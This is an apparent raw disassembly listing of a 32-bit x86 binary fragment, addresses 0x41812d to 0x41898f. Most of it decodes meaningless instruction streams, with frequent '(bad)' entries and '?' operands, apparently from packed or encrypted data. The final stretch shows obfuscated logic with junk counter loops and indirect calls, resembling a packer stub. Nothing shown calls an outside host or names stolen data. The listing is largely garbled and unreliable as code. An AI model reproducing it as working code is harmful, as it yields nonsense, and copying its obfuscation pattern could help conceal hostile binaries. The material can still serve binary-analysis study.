  41812d:	repz sub DWORD PTR [ebx+ebp*2-0x4d2fe3b],edi
  418135:	stc    
  418136:	pop    esp
  418137:	xchg   dl,dl
  418139:	and    esp,edx
  41813b:	and    eax,0x6144a5f6
  418140:	mov    eax,ds:0x34eba2e3
  418145:	inc    ebx
  418146:	adc    DWORD PTR [esi],0x65
  418149:	addr16 pusha 
  41814b:	pop    ds
  41814c:	aas    
  41814d:	sub    al,0x7c
  41814f:	push   esp
  418150:	push   ebx
  418151:	(bad)  
  418152:	fcom   QWORD PTR [ebx]
  418154:	sbb    edi,edx
  418156:	dec    ebp
  418157:	nop
  418158:	cdq    
  418159:	lds    esp,FWORD PTR [esi-0x6d]
  41815c:	adc    BYTE PTR [edx],0x6d
  41815f:	outs   dx,DWORD PTR ds:[esi]
  418160:	mov    edx,0xc80f03ed
  418165:	rol    BYTE PTR [esi+0x1e7c48a4],cl
  41816b:	mov    ?,WORD PTR [eax+0x5f]
  41816e:	push   ds
  41816f:	mov    esp,?
  418171:	xchg   ebp,eax
  418172:	loope  0x4181b0
  418174:	(bad)  
  418175:	jmp    0x546b:0xdb69e427
  41817c:	jl     0x41811c
  41817e:	mov    ebp,0xd2ae43ac
  418183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418184:	in     al,0x70
  418186:	daa    
  418187:	pushf  
  418188:	fild   DWORD PTR [eax+eiz*4]
  41818b:	inc    ebp
  41818c:	jae    0x4181d4
  41818e:	pop    esp
  41818f:	jo     0x41820e
  418191:	mov    al,ds:0xb5b9415a
  418196:	mov    ebx,0xc007c5a8
  41819b:	scas   al,BYTE PTR es:[edi]
  41819c:	fwait
  41819d:	adc    eax,0x130bc527
  4181a2:	mov    ds,WORD PTR [esi+edx*8]
  4181a5:	mov    ch,0x74
  4181a7:	xor    edx,DWORD PTR [esi]
  4181a9:	or     al,0xc3
  4181ab:	adc    ah,bh
  4181ad:	call   0x6e10062e
  4181b2:	push   edx
  4181b3:	mov    bh,0xc9
  4181b5:	test   eax,0x60cbedb1
  4181ba:	ins    DWORD PTR es:[edi],dx
  4181bb:	cwde   
  4181bc:	test   eax,0x6f8e9fa5
  4181c1:	test   BYTE PTR ds:0xbaecb862,bh
  4181c7:	loop   0x418224
  4181c9:	retf   
  4181ca:	push   eax
  4181cb:	scas   al,BYTE PTR es:[edi]
  4181cc:	int3   
  4181cd:	(bad)  
  4181cf:	outs   dx,BYTE PTR ds:[esi]
  4181d0:	fucom  st(4)
  4181d2:	lahf   
  4181d3:	cdq    
  4181d4:	jg     0x418254
  4181d6:	jns    0x41822a
  4181d8:	loop   0x41815f
  4181da:	fistp  DWORD PTR [ebp-0x45]
  4181dd:	sbb    al,0x94
  4181df:	(bad)  
  4181e1:	mov    DWORD PTR [ebx+0x61],ecx
  4181e4:	hlt    
  4181e5:	xchg   ecx,eax
  4181e6:	pushf  
  4181e7:	push   cs
  4181e8:	popf   
  4181e9:	aad    0x17
  4181eb:	(bad)  
  4181ec:	cmp    eax,0xf2880f68
  4181f1:	push   ebp
  4181f2:	(bad)  
  4181f3:	or     ch,BYTE PTR [ebp-0x32276b74]
  4181f9:	xchg   edi,eax
  4181fa:	in     al,dx
  4181fb:	xchg   esp,eax
  4181fc:	loope  0x418223
  4181fe:	js     0x41826f
  418200:	in     al,dx
  418201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418202:	xchg   esp,eax
  418203:	push   0x504d067e
  418208:	xchg   BYTE PTR [ecx],ah
  41820a:	xchg   esp,eax
  41820b:	int3   
  41820c:	pop    ss
  41820d:	(bad)  
  41820e:	repz pop eax
  418210:	popf   
  418211:	mov    ds:0xc576582,al
  418216:	inc    edi
  418217:	xor    cl,0x43
  41821a:	inc    ecx
  41821b:	push   cs
  41821c:	cmp    bh,bl
  41821e:	dec    esi
  41821f:	xchg   edi,eax
  418220:	mov    ecx,0x571868b6
  418225:	push   edx
  418226:	and    dl,BYTE PTR [ebx+0x2e13772]
  41822c:	jns    0x41821a
  41822e:	add    BYTE PTR [eax+eax*1-0x15bfe815],0xb9
  418236:	pop    ds
  418237:	aam    0xa0
  418239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41823a:	pushf  
  41823b:	or     BYTE PTR [eax-0x25],cl
  41823e:	dec    ecx
  41823f:	out    dx,eax
  418240:	inc    ecx
  418241:	jns    0x4181c4
  418243:	outs   dx,DWORD PTR ds:[esi]
  418244:	add    bl,BYTE PTR [ecx+0x1d9353b]
  41824a:	push   ebp
  41824b:	xchg   esi,eax
  41824c:	push   esp
  41824d:	scas   al,BYTE PTR es:[edi]
  41824e:	(bad)  
  41824f:	bound  edx,QWORD PTR [edi+0x42]
  418252:	push   eax
  418253:	jmp    0x418246
  418255:	inc    esp
  418256:	xchg   edx,eax
  418257:	cmp    ecx,DWORD PTR [ecx+0x29026e65]
  41825d:	pop    edi
  41825e:	lahf   
  41825f:	rcl    BYTE PTR [edx+edi*8-0x22],cl
  418263:	test   DWORD PTR [ebx],eax
  418265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418266:	add    edx,DWORD PTR [edi+0xd80e0fa]
  41826c:	mov    esi,ebp
  41826e:	add    ebx,edi
  418270:	mov    DWORD PTR [eax-0x32],ebp
  418273:	(bad)  [ecx+0x668f571f]
  418279:	jae    0x418228
  41827b:	shr    DWORD PTR ds:0x1f580c26,0xf1
  418282:	call   0x4c899d76
  418287:	pop    ebp
  418288:	and    al,al
  41828a:	gs aam 0x7c
  41828d:	adc    cl,dh
  41828f:	mov    eax,ds:0xea1b89d2
  418294:	xchg   ch,ch
  418296:	inc    eax
  418297:	in     eax,dx
  418298:	xlat   BYTE PTR ds:[ebx]
  418299:	out    dx,al
  41829a:	dec    ebx
  41829b:	jg     0x4182c2
  41829d:	and    bl,BYTE PTR ds:0xb2ef1faf
  4182a3:	dec    edx
  4182a4:	ds inc eax
  4182a6:	fistp  DWORD PTR [esi]
  4182a8:	or     BYTE PTR [ebx-0x7a],bh
  4182ab:	out    0x23,eax
  4182ad:	xchg   esp,eax
  4182ae:	add    DWORD PTR [ebx],edx
  4182b0:	(bad)  
  4182b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182b2:	push   edx
  4182b3:	shl    BYTE PTR [esi-0x26389a27],0xdc
  4182ba:	push   ecx
  4182bb:	mov    ds:0x5246fd52,eax
  4182c0:	dec    eax
  4182c1:	add    edx,DWORD PTR [ecx+0x67657528]
  4182c7:	test   BYTE PTR [esi-0x6b282380],bl
  4182cd:	lods   eax,DWORD PTR ds:[esi]
  4182ce:	adc    ebx,ecx
  4182d0:	push   0x904b8a7a
  4182d5:	add    esi,DWORD PTR [ebp+0x32]
  4182d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182d9:	pop    edx
  4182da:	loopne 0x418341
  4182dc:	ret    
  4182dd:	es fldln2 
  4182e0:	or     DWORD PTR [eax-0x70],edi
  4182e3:	cli    
  4182e4:	cmp    edi,esp
  4182e6:	add    DWORD PTR [ebp+0xb],eax
  4182e9:	cmp    DWORD PTR [edx-0x303fe04b],eax
  4182ef:	dec    esi
  4182f0:	jmp    DWORD PTR [edx]
  4182f2:	daa    
  4182f3:	icebp  
  4182f4:	sub    al,0x47
  4182f6:	cmp    ebp,DWORD PTR [eax-0x5f]
  4182f9:	shl    BYTE PTR [edx-0x7e],cl
  4182fc:	push   edi
  4182fd:	subps  xmm1,XMMWORD PTR [ebp+0x2a]
  418301:	jge    0x418347
  418303:	xor    BYTE PTR ds:0x40fc3ab6,ah
  418309:	(bad)  
  41830b:	stos   BYTE PTR es:[edi],al
  41830c:	jge    0x418303
  41830e:	out    dx,eax
  41830f:	xchg   DWORD PTR [edx+0x5e6aedb9],edx
  418315:	or     ebx,DWORD PTR [ebp+0x4857daa2]
  41831b:	lock ret 0xa2fb
  41831f:	mov    dl,0x1f
  418321:	sti    
  418322:	jge    0x4182d6
  418324:	mov    al,0x2f
  418326:	lods   eax,DWORD PTR ds:[esi]
  418327:	bound  edi,QWORD PTR [eax-0x66]
  41832a:	mov    ebp,0x9716fcf9
  41832f:	ja     0x418336
  418331:	cli    
  418332:	je     0x418365
  418334:	mov    bh,al
  418336:	in     al,0x91
  418338:	xchg   edx,eax
  418339:	outs   dx,BYTE PTR ds:[esi]
  41833a:	out    dx,eax
  41833b:	inc    edx
  41833c:	inc    esi
  41833d:	dec    eax
  41833e:	(bad)  
  41833f:	call   0xbc9b:0xfcb3a98a
  418346:	xor    DWORD PTR [edi-0x58],ecx
  418349:	and    al,0x74
  41834b:	jo     0x4182ed
  41834d:	adc    bl,BYTE PTR [ecx-0x24]
  418350:	outs   dx,DWORD PTR ds:[esi]
  418351:	in     al,dx
  418352:	cmp    DWORD PTR ds:0x26234e51,esp
  418358:	pushf  
  418359:	mov    bl,BYTE PTR [esi]
  41835b:	in     al,0x65
  41835d:	rcl    DWORD PTR [edx+ecx*2-0x6d],0xf
  418362:	mov    ecx,0x60a7b3dd
  418367:	mov    BYTE PTR ds:0xbe33d836,ah
  41836d:	mov    eax,0x92bb06e3
  418372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418373:	retf   
  418374:	cwde   
  418375:	mov    edx,0xb6a4024b
  41837a:	pop    edi
  41837b:	push   es
  41837c:	inc    edx
  41837d:	jb     0x41833e
  41837f:	dec    ebp
  418380:	call   0x2f8a:0x25f711ba
  418387:	out    dx,al
  418388:	add    al,al
  41838a:	aam    0xa8
  41838c:	dec    eax
  41838d:	sub    DWORD PTR [ebx],esi
  41838f:	push   esi
  418390:	push   0xffffffca
  418392:	cwde   
  418393:	dec    eax
  418394:	out    dx,al
  418395:	ins    DWORD PTR es:[edi],dx
  418396:	imul   ecx,ebx,0xffffff88
  418399:	pop    edi
  41839a:	jp     0x418351
  41839c:	inc    edx
  41839d:	and    bl,BYTE PTR [edi+0x1c]
  4183a0:	daa    
  4183a1:	inc    esp
  4183a2:	aad    0x1d
  4183a4:	or     DWORD PTR [eax-0x76636c80],0xfffffffe
  4183ab:	dec    edi
  4183ac:	push   esp
  4183ad:	jns    0x418392
  4183af:	repz fsubr QWORD PTR [edi+0x58]
  4183b3:	lods   al,BYTE PTR ds:[esi]
  4183b4:	enter  0xae8d,0x70
  4183b8:	pusha  
  4183b9:	mov    al,0x68
  4183bb:	and    bh,BYTE PTR [ebp+ebx*4+0x7]
  4183bf:	sbb    al,0x25
  4183c1:	xor    eax,0x2da64d6f
  4183c6:	call   0x5b2d:0xdf2a2d95
  4183cd:	ficomp WORD PTR [ecx-0x46]
  4183d0:	repz mov bh,0xf
  4183d3:	xchg   dl,dh
  4183d5:	ja     0x41836c
  4183d7:	out    0x75,eax
  4183d9:	sbb    DWORD PTR [edx],0x16
  4183dc:	jmp    0x4183f0
  4183de:	pop    esi
  4183df:	stos   DWORD PTR es:[edi],eax
  4183e0:	sbb    esp,esp
  4183e2:	sub    eax,0x6dcc8e9d
  4183e8:	cmp    BYTE PTR cs:[ebx],bl
  4183eb:	dec    edx
  4183ec:	and    al,0xdf
  4183ee:	add    al,0xe7
  4183f0:	dec    esp
  4183f1:	xchg   ebx,eax
  4183f2:	test   al,0xd7
  4183f4:	retf   0xb661
  4183f7:	mov    dl,0x86
  4183f9:	aad    0xb3
  4183fb:	les    esp,FWORD PTR [ebp-0xe6dfc53]
  418401:	inc    ebx
  418402:	out    dx,al
  418403:	jb     0x41841d
  418405:	icebp  
  418406:	jne    0x4183f6
  418408:	(bad)  
  418409:	retf   0x1472
  41840c:	dec    esi
  41840d:	xor    DWORD PTR [esi+0x33726999],ebp
  418413:	fstp   TBYTE PTR [ebx]
  418415:	sbb    BYTE PTR [edx+0x64],dh
  418418:	xor    BYTE PTR [ebp+0x5],bl
  41841b:	sbb    dh,BYTE PTR [ebx+0x1a81f9b6]
  418421:	adc    eax,0x11dfafc2
  418426:	adc    al,BYTE PTR ds:0x9a69f9a4
  41842c:	xchg   esi,eax
  41842d:	imul   esi,eax,0x2e
  418430:	nop
  418431:	test   BYTE PTR [edx-0x34],dh
  418434:	and    eax,0xf6a9b6a1
  418439:	push   ebx
  41843a:	push   ds
  41843b:	ror    DWORD PTR [edi],0xfc
  41843e:	pop    edi
  41843f:	cs or  edx,edi
  418442:	jp     0x418497
  418444:	xchg   esi,eax
  418445:	mov    DWORD PTR [edx+ecx*4+0x15861bd2],ecx
  41844c:	push   eax
  41844d:	and    al,0x8c
  41844f:	and    bh,BYTE PTR [ebp+0x52]
  418452:	call   0x65f9:0xb4c74fde
  418459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41845a:	mov    DWORD PTR [ecx-0x68],ebp
  41845d:	dec    edx
  41845e:	add    al,0xf4
  418460:	cmp    BYTE PTR [eax],0xb
  418463:	xchg   ebx,eax
  418464:	xor    al,BYTE PTR [esi+0x52]
  418467:	fcomp  st(4)
  418469:	sub    esi,DWORD PTR [ecx]
  41846b:	xor    BYTE PTR [edi],dh
  41846d:	sbb    ebp,ebp
  41846f:	mov    ebp,0xeab76bcd
  418474:	mov    ds:0xf05949b9,al
  418479:	add    cl,BYTE PTR [ebx-0xf]
  41847c:	sbb    dl,BYTE PTR [eax-0x54]
  41847f:	rcr    DWORD PTR [ecx+0x2b],0x73
  418483:	cmp    bl,ah
  418485:	stc    
  418486:	xchg   esp,eax
  418487:	push   esi
  418488:	add    DWORD PTR [edx-0x5e48d675],edi
  41848e:	push   edi
  41848f:	daa    
  418490:	fnstenv [edx]
  418492:	ror    eax,1
  418494:	mov    edx,0xad691005
  418499:	(bad)  
  41849a:	adc    ah,BYTE PTR [edx+0x18]
  41849d:	icebp  
  41849e:	xor    ebp,DWORD PTR [ecx]
  4184a0:	or     DWORD PTR [esi],eax
  4184a2:	mov    edi,eax
  4184a4:	in     al,0xb
  4184a6:	call   0x56ea78e
  4184ab:	out    0x42,al
  4184ad:	hlt    
  4184ae:	xchg   BYTE PTR [ecx-0x67],bh
  4184b1:	cmp    DWORD PTR [eax-0x41ae1d76],esi
  4184b7:	lahf   
  4184b8:	inc    ebp
  4184b9:	adc    al,0x5b
  4184bb:	and    al,0x8e
  4184bd:	push   edx
  4184be:	aam    0x6e
  4184c0:	int3   
  4184c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c2:	imul   esi,esp,0xf8a0e26e
  4184c8:	call   0x54e5c825
  4184cd:	pop    edi
  4184ce:	test   al,0xf1
  4184d0:	scas   eax,DWORD PTR es:[edi]
  4184d1:	ds nop
  4184d3:	xchg   edi,eax
  4184d4:	cmp    esp,esp
  4184d6:	test   dl,ah
  4184d8:	mov    ?,ebp
  4184da:	xchg   edx,eax
  4184db:	enter  0x5d0d,0x1d
  4184df:	jns    0x41851b
  4184e1:	cwde   
  4184e2:	ins    BYTE PTR es:[edi],dx
  4184e3:	leave  
  4184e4:	push   es
  4184e5:	ds fwait
  4184e7:	dec    edi
  4184e8:	adc    ah,BYTE PTR [ebp-0x6fb76a82]
  4184ee:	outs   dx,DWORD PTR ds:[esi]
  4184ef:	pop    eax
  4184f0:	test   al,0xe5
  4184f3:	lods   al,BYTE PTR ds:[esi]
  4184f4:	es fs ss sbb al,0xb7
  4184f9:	push   es
  4184fa:	fcmovne st,st(3)
  4184fc:	add    eax,0x552a236
  418501:	or     ebp,edi
  418503:	mov    ebx,0xfa80bad8
  418508:	push   cs
  418509:	pop    ss
  41850a:	adc    esi,esp
  41850c:	mov    eax,ds:0x3092aac2
  418511:	pop    ds
  418512:	pushf  
  418513:	sub    BYTE PTR [esi],dl
  418515:	daa    
  418516:	stc    
  418517:	(bad)  
  418519:	in     al,0x28
  41851b:	aas    
  41851c:	jns    0x4184da
  41851e:	jns    0x41853f
  418520:	lods   eax,DWORD PTR ds:[esi]
  418521:	push   cs
  418522:	ret    0xc96e
  418525:	xchg   ecx,eax
  418526:	retf   0xb3d
  418529:	jmp    0x41855c
  41852b:	sbb    eax,0x818553f3
  418530:	jge    0x4184d2
  418532:	jle    0x418555
  418534:	push   ebx
  418535:	and    ebx,DWORD PTR [ebx-0x19]
  418538:	xor    eax,0x88398397
  41853d:	push   0x33b31d97
  418542:	dec    ebp
  418543:	jo     0x418542
  418545:	clc    
  418546:	fsubr  QWORD PTR [ecx-0x260dbe]
  41854c:	sub    al,BYTE PTR [ecx]
  41854e:	aaa    
  41854f:	or     DWORD PTR [ebx+0x5a],ecx
  418552:	xchg   esp,eax
  418553:	cmp    bl,BYTE PTR [edx]
  418555:	fdiv   QWORD PTR [eax]
  418557:	xor    al,0xe4
  418559:	lods   eax,DWORD PTR ds:[esi]
  41855a:	ror    DWORD PTR es:[edi],0x2f
  41855e:	mov    ds,WORD PTR [eax-0xd7ba7dc]
  418564:	or     eax,0x8de77360
  418569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856a:	test   al,0xd6
  41856c:	test   DWORD PTR [ecx],0x821875be
  418572:	pusha  
  418573:	mov    DWORD PTR [esi+edi*1],eax
  418576:	int    0xdf
  418578:	pop    esp
  418579:	lds    eax,FWORD PTR [esi+0x23a38a68]
  41857f:	imul   edx,DWORD PTR [esi],0x5180a5b3
  418585:	dec    eax
  418586:	push   cs
  418587:	jp     0x4185c6
  418589:	inc    ecx
  41858a:	dec    esi
  41858b:	int    0xea
  41858d:	xchg   esp,eax
  41858e:	xor    cl,BYTE PTR [esp+eiz*2+0x6a]
  418592:	jle    0x4185af
  418594:	mov    ecx,0x654f4eb0
  418599:	adc    al,0x11
  41859b:	mov    ds:0x877727a3,eax
  4185a0:	dec    ebp
  4185a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185a2:	mov    al,ds:0xe36896e4
  4185a7:	mov    ebx,0x2508dd29
  4185ac:	shrd   esi,edx,cl
  4185af:	or     DWORD PTR [ecx+0xc81f169],edi
  4185b5:	cwde   
  4185b6:	test   BYTE PTR [ecx+0x56df377a],bh
  4185bc:	cmp    dl,BYTE PTR [edx-0x321b580b]
  4185c2:	xor    bl,BYTE PTR [ebx+0x6]
  4185c5:	mov    ds:0x44f876f6,al
  4185ca:	test   DWORD PTR [edx-0x24],edx
  4185cd:	cmc    
  4185ce:	sub    BYTE PTR [esi-0x61b14dcb],bh
  4185d4:	pop    ecx
  4185d5:	pop    edx
  4185d6:	mov    BYTE PTR [esi+0x4e],al
  4185d9:	ret    0x8755
  4185dc:	ret    0x38f9
  4185df:	bound  edi,QWORD PTR [edx-0x6bfcb4b]
  4185e5:	mov    ah,0x6b
  4185e7:	ret    0xe62
  4185ea:	shl    DWORD PTR [esi+esi*1+0x50],1
  4185ee:	fisttp WORD PTR [edi-0x57a3edfd]
  4185f4:	xchg   edi,eax
  4185f5:	mov    bh,0xfd
  4185f7:	jae    0x41858b
  4185f9:	out    dx,eax
  4185fa:	or     esi,DWORD PTR [esi-0x6e]
  4185fd:	push   ebp
  4185fe:	mov    esi,DWORD PTR [ebx-0x1e]
  418601:	stc    
  418602:	sbb    DWORD PTR [eax+ecx*4+0x2652e46f],0x40b6dcb3
  41860d:	rcl    bh,1
  41860f:	imul   edx,esp,0xb9557450
  418615:	test   ch,0x69
  418618:	cmp    dl,BYTE PTR [ebp-0x54]
  41861b:	nop
  41861c:	mov    ah,0xc9
  41861e:	out    0x9d,al
  418620:	push   edi
  418621:	mov    fs,WORD PTR fs:[ecx]
  418624:	(bad)  
  418625:	call   0xf321:0x385cac2f
  41862c:	inc    ebp
  41862d:	push   edi
  41862e:	adc    BYTE PTR [eax+0x254a491],bh
  418634:	and    eax,0x9456ba26
  418639:	fmulp  st(6),st
  41863b:	mov    ds:0x4db38705,al
  418640:	cmp    DWORD PTR [eax-0x6d],eax
  418643:	mov    bl,0x28
  418645:	in     eax,dx
  418646:	mov    al,ds:0x600dd57f
  41864b:	xor    al,0x2d
  41864d:	popa   
  41864e:	inc    esp
  41864f:	enter  0x9df9,0xaa
  418653:	clc    
  418654:	call   0xce5e:0x119afc29
  41865b:	imul   edi,DWORD PTR [ebp+0x49],0xac024ebd
  418662:	adc    ecx,DWORD PTR [esi-0x40]
  418665:	jbe    0x418602
  418667:	popa   
  418668:	mov    ?,WORD PTR [edi+eax*4]
  41866b:	sub    al,0xdf
  41866d:	cmp    al,0x54
  41866f:	test   eax,0x44b51b2
  418674:	add    al,0x68
  418676:	aas    
  418677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418678:	jnp    0x4186b0
  41867a:	je     0x41866e
  41867c:	jns    0x418683
  41867e:	dec    eax
  41867f:	sbb    BYTE PTR [ecx-0xa],ah
  418682:	std    
  418683:	loop   0x4186a9
  418685:	jmp    0x1907:0x172f3347
  41868c:	or     al,0x40
  41868e:	adc    BYTE PTR [ebp-0x7c],dh
  418691:	fistp  DWORD PTR [esi-0x74]
  418694:	lahf   
  418695:	sti    
  418696:	mov    esp,DWORD PTR [ebx+0x55]
  418699:	call   0xdba5:0x57d8f996
  4186a0:	ficomp DWORD PTR [ebx-0x4e082f58]
  4186a6:	stos   BYTE PTR es:[di],al
  4186a8:	mov    ds:0x7e89a16b,al
  4186ad:	scas   al,BYTE PTR es:[edi]
  4186ae:	fist   DWORD PTR [ecx]
  4186b0:	dec    edx
  4186b1:	sub    al,0x1a
  4186b3:	imul   ebx,ebp,0xf699447b
  4186b9:	cmovge ebp,edx
  4186bc:	and    al,0x6d
  4186be:	mov    dl,0x7c
  4186c0:	push   cs
  4186c1:	ja     0x4186d6
  4186c3:	ss jbe 0x4186bd
  4186c6:	ss jmp 0xf234ab45
  4186cc:	jle    0x4186a5
  4186ce:	loopne 0x418736
  4186d0:	fidiv  WORD PTR [edi-0xce5176e]
  4186d6:	out    dx,al
  4186d7:	pop    eax
  4186d8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186da:	stos   BYTE PTR es:[edi],al
  4186db:	mov    bh,0xa2
  4186dd:	cmp    BYTE PTR [ebp-0x1c9bc812],0xdc
  4186e4:	std    
  4186e5:	push   edi
  4186e6:	in     eax,0xea
  4186e8:	add    esp,DWORD PTR [esi-0x47]
  4186eb:	bound  edi,QWORD PTR [edx]
  4186ed:	xor    eax,0x55550832
  4186f2:	mov    edx,?
  4186f4:	mov    esp,0x61c21c5e
  4186f9:	jecxz  0x4186f6
  4186fb:	or     edx,edi
  4186fd:	mov    edi,0xb0f57282
  418702:	jmp    0x20bd7efe
  418707:	dec    eax
  418708:	out    dx,al
  418709:	not    DWORD PTR [edi+0x6c]
  41870c:	cmp    eax,0x641925c1
  418711:	ins    DWORD PTR es:[edi],dx
  418712:	jg     0x41871e
  418714:	xchg   esi,eax
  418715:	(bad)  
  418716:	in     eax,dx
  418717:	lahf   
  418718:	(bad)  [eax]
  41871a:	jno    0x41875e
  41871c:	call   0xa42d:0x76ec2a3f
  418723:	jne    0x418787
  418725:	test   DWORD PTR [edx+0x489057f5],0xb0e2a000
  41872f:	or     esp,DWORD PTR [edx+ebx*1+0x2efc6254]
  418736:	mov    bl,0xbe
  418738:	pop    ebx
  418739:	mov    al,ds:0xd0464ec1
  41873e:	fadd   st,st(2)
  418740:	jno    0x418776
  418742:	loopne 0x41873d
  418744:	mov    eax,ds:0x4a046ae9
  418749:	jb     0x41874f
  41874b:	ret    
  41874c:	test   DWORD PTR [ebx+0x2e],0xd3ca3d9b
  418753:	push   esi
  418754:	pop    ecx
  418755:	cwde   
  418756:	data16 loop 0x418740
  418759:	(bad)  
  41875a:	clc    
  41875b:	push   cs
  41875c:	jae    0x418712
  41875e:	sub    edi,edx
  418760:	sub    ebx,DWORD PTR [eax+0x4f]
  418763:	jecxz  0x4187df
  418765:	mov    ah,0xc8
  418767:	jge    0x4187a6
  418769:	jp     0x4187c3
  41876b:	sub    BYTE PTR [eax-0x51511a18],bh
  418771:	pop    es
  418772:	out    0xc9,eax
  418774:	adc    cl,BYTE PTR [edi]
  418776:	push   eax
  418777:	(bad)  
  418778:	repnz icebp 
  41877a:	pop    eax
  41877b:	(bad)
  41877e:	cmp    BYTE PTR [edx-0x395bda41],dl
  418784:	in     al,0xd8
  418786:	enter  0x60d7,0x18
  41878a:	pop    ds
  41878b:	sbb    eax,0x675f517b
  418790:	test   BYTE PTR [edx+ecx*2-0xc],dl
  418794:	cli    
  418795:	xor    DWORD PTR [ecx-0x8c9973e],esi
  41879b:	sub    BYTE PTR ds:0x59a4af99,al
  4187a1:	in     al,dx
  4187a2:	lods   al,BYTE PTR ds:[esi]
  4187a3:	inc    ecx
  4187a4:	ins    BYTE PTR es:[edi],dx
  4187a5:	iret   
  4187a6:	and    DWORD PTR [ebx-0x2f25f407],eax
  4187ac:	push   cs
  4187ad:	sbb    al,BYTE PTR [edx+0x6a94deb9]
  4187b3:	push   ebx
  4187b4:	mov    dh,BYTE PTR [eax-0x3d875f69]
  4187ba:	xchg   ecx,eax
  4187bb:	and    edi,edx
  4187bd:	mov    bl,0x12
  4187bf:	xchg   DWORD PTR [edi-0x31],esi
  4187c2:	jbe    0x4187e6
  4187c4:	cmp    DWORD PTR [edx+0x4d],ecx
  4187c7:	(bad)  
  4187c8:	xchg   ecx,eax
  4187c9:	mov    ecx,0x9fb20b5d
  4187ce:	mov    edi,gs
  4187d0:	test   eax,0xfe7a540
  4187d5:	mov    DWORD PTR [eax+0x58b0267f],esp
  4187db:	and    DWORD PTR [ebp+0x4b],ecx
  4187de:	jp     0x418815
  4187e0:	movd   ecx,mm6
  4187e3:	in     al,0x7b
  4187e5:	push   0xffffffb9
  4187e7:	into   
  4187e8:	pop    edx
  4187e9:	sub    al,0x18
  4187eb:	ret    
  4187ec:	adc    BYTE PTR [ebx+0x72],bl
  4187ef:	mov    esi,edx
  4187f1:	mov    ecx,edi
  4187f3:	mov    BYTE PTR [esi],ah
  4187f5:	scas   eax,DWORD PTR es:[edi]
  4187f6:	imul   DWORD PTR [edi-0x4d770428]
  4187fc:	out    dx,eax
  4187fd:	fimul  WORD PTR [ebx-0x46]
  418800:	cmc    
  418801:	inc    eax
  418802:	aaa    
  418803:	pop    ebp
  418804:	xchg   edx,eax
  418805:	loopne 0x418854
  418807:	sbb    eax,0x21073a31
  41880c:	jns    0x418809
  41880e:	jo     0x418863
  418810:	into   
  418811:	pop    esp
  418812:	cmc    
  418813:	das    
  418814:	test   BYTE PTR [ebx+0x100bcd10],bl
  41881a:	fild   WORD PTR [ebp+0x52b9ff96]
  418820:	jne    0x41643d
  418826:	sbb    DWORD PTR ds:0x42b000,0x3322
  418830:	mov    ecx,DWORD PTR [ebp-0x18]
  418833:	mov    edx,DWORD PTR [ebp+0x10]
  418836:	adc    edi,DWORD PTR ds:0x42a014
  41883c:	xor    ecx,eax
  41883e:	add    ecx,esi
  418840:	mov    DWORD PTR [edx],ecx
  418842:	and    DWORD PTR ds:0x42d008,0x0
  41884c:	jmp    0x41885e
  418851:	mov    ecx,DWORD PTR ds:0x42d008
  418857:	inc    ecx
  418858:	mov    DWORD PTR ds:0x42d008,ecx
  41885e:	cmp    DWORD PTR ds:0x42d008,0x1f
  418865:	jae    0x418890
  41886b:	cmp    DWORD PTR ds:0x42d008,0x2c
  418872:	ja     0x418890
  418878:	jmp    0x41888b
  41887d:	push   DWORD PTR [ebp-0x20]
  418880:	push   0x8204
  418885:	call   DWORD PTR ds:0x430037
  41888b:	jmp    0x418851
  418890:	mov    ecx,DWORD PTR [ebp-0x18]
  418893:	xor    edi,edi
  418895:	xor    edi,DWORD PTR ds:0x42a010
  41889b:	or     edi,DWORD PTR ds:0x42a008
  4188a1:	mov    DWORD PTR ds:0x42a010,edi
  4188a7:	xor    ecx,eax
  4188a9:	sub    DWORD PTR ds:0x42a008,edx
  4188af:	add    ecx,esi
  4188b1:	mov    DWORD PTR ds:0x42b010,0x12
  4188bb:	cmp    DWORD PTR ds:0x42b010,0x0
  4188c2:	je     0x41891a
  4188c8:	cmp    DWORD PTR ds:0x42b010,0x7
  4188cf:	jl     0x41891a
  4188d5:	jmp    0x4188ec
  4188da:	push   0x42f000
  4188df:	push   0x1
  4188e1:	push   0x49bf
  4188e6:	call   DWORD PTR ds:0x43003b
  4188ec:	cmp    DWORD PTR ds:0x42b010,0x8
  4188f3:	jne    0x418906
  4188f9:	mov    edi,DWORD PTR ds:0x42b010
  4188ff:	dec    edi
  418900:	mov    DWORD PTR ds:0x42b010,edi
  418906:	xor    edi,edi
  418908:	or     edi,DWORD PTR ds:0x42b010
  41890e:	dec    edi
  41890f:	mov    DWORD PTR ds:0x42b010,edi
  418915:	jmp    0x4188bb
  41891a:	mov    DWORD PTR [ebp-0xc],ecx
  41891d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  418924:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  41892b:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  418932:	xor    edi,edi
  418934:	or     edi,DWORD PTR ds:0x42a008
  41893a:	adc    DWORD PTR ds:0x429018,edi
  418940:	mov    ecx,DWORD PTR [ebp-0x14]
  418943:	mov    DWORD PTR [ebp+0x8],ecx
  418946:	add    ecx,edi
  418948:	mov    ecx,DWORD PTR [ebp+0x8]
  41894b:	xor    ecx,eax
  41894d:	adc    DWORD PTR ds:0x429024,edi
  418953:	add    ecx,esi
  418955:	not    ecx
  418957:	mov    ecx,0x242ebcc
  41895c:	mov    DWORD PTR ds:0x42b00c,0x46db
  418966:	mov    edi,0xf641bc3
  41896b:	je     0x41d78a
  418971:	mov    DWORD PTR ds:0x42a00c,0x5fae
  41897b:	mov    edx,DWORD PTR [ebp+0x8]
  41897e:	and    DWORD PTR ds:0x429020,0x0
  418988:	mov    ebx,DWORD PTR ds:0x429020
  41898e:	inc    ebx
  41898f:	mov    DWORD PTR ds:0x429020,ebx
